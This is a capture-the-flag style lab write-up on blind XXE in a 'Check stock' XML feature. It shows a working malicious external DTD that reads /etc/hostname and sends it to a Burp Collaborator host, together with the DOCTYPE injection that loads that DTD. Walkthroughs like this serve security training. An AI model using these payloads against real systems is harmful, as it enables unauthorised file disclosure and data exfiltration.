# Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD

>This lab has a "Check stock" feature that parses XML input but does not display the result.

>To solve the lab, exfiltrate the contents of the /etc/hostname file.

### Observations
My burp collaborator instance: `bapx36nws7mgxxnh9d3bcbqu2l8cw1.burpcollaborator.net`

There are 2 major things that we need to accomplish with our injected XML
- Read contents of /etc/hostname (`file:///etc/hostname`)
- Make a request to `/exploit` and exfil the contents above

My first attempt at creating a payload resulted in this, which did not work:

`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://" + file://etc/hostname +
"exploit-ac4e1f3c1f918ea0c058632601a7004d.web-security-academy.net/exploit"> %xxe; ]`

### Next steps
The lab title also says that we will have an external DTD, which leads me to believe that we will use the built-in exploit server for this. Enter the following for the exploit body (ignore the set of `"""` and put the url to your own collaborator instance):

"""

<!ENTITY % file SYSTEM "file:///etc/hostname">

<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://bapx36nws7mgxxnh9d3bcbqu2l8cw1.burpcollaborator.net/x=%file;'>">

%eval;

%exfil;

"""

The first line reads the data from `/etc/hostname`, while the second line sends a GET request to our collaborator instance, requesting the file `x`, which is equal to the contents of `/etc/hostname`

### Solution
Now that we have our external dtd finished and located at `/exploit`, we can call it from our request to `POST /product/stock`... Add the following xml to the request to call this external dtd


`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-ac4e1f3c1f918ea0c058632601a7004d.web-security-academy.net/exploit"> %xxe;]`


You will see some requests in your burp collaborator instance, dig into the HTTP request and click the "Request to Collaborator" tab. We can see the following `GET /x=e91f6f9ddb94`

The value of x is the contents of `/etc/hostname` as we defined here `/x=%file`

Lab solved!
